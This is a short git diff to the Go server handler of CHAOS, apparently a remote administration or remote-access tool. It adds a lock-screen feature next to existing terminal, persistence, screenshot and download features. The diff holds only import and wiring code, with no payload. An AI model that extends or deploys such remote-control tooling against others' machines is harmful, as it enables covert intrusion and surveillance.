@@ -11,6 +11,7 @@ import (
 	"github.com/tiagorlampert/CHAOS/internal/usecase"
 	"github.com/tiagorlampert/CHAOS/internal/usecase/download"
 	"github.com/tiagorlampert/CHAOS/internal/usecase/information"
+	"github.com/tiagorlampert/CHAOS/internal/usecase/lock_screen"
 	"github.com/tiagorlampert/CHAOS/internal/usecase/open_url"
 	"github.com/tiagorlampert/CHAOS/internal/usecase/persistence"
 	"github.com/tiagorlampert/CHAOS/internal/usecase/screenshot"
@@ -154,6 +155,7 @@ func (server *ServerHandler) connect(v []string) {
 	screenshotUseCase := screenshot.NewScreenshotUseCase(device.Connection)
 	persistenceUseCase := persistence.NewPersistenceUseCase(device.Connection)
 	openURLUseCase := open_url.NewOpenURLUseCase(device.Connection)
+	lockScreenUseCase := lock_screen.NewLockScreenUseCase(device.Connection)
 
 	useCase := usecase.UseCase{
 		Terminal:    terminalUseCase,
@@ -163,6 +165,7 @@ func (server *ServerHandler) connect(v []string) {
 		Screenshot:  screenshotUseCase,
 		Persistence: persistenceUseCase,
 		OpenURL:     openURLUseCase,
+		LockScreen:  lockScreenUseCase,
 	}
 
 	client.NewClientHandler(device.Connection, &useCase).HandleConnection(device.Hostname, device.UserID)
